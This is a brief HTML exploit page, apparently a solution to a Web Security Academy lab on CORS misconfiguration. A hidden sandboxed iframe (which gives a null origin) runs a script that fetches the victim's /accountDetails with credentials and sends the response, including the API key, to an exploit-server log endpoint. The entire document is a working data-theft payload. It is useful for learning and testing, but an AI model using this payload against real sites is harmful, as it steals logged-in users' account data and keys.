<html>
    <body>
        <iframe style="display: none;" sandbox="allow-scripts" srcdoc="
        <script>
            var xhr = new XMLHttpRequest();
            var url = 'https://0ad500120414757281776b4d00560082.web-security-academy.net'

            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    fetch('https://exploit-0a1b00bf04f37516818c6af101b70055.exploit-server.net/exploit/log?key=' + xhr.responseText)
                }
            }

            xhr.open('GET', url + '/accountDetails', true);
            xhr.withCredentials = true;
            xhr.send(null);
        </script>"></iframe>
    </body>
</html>
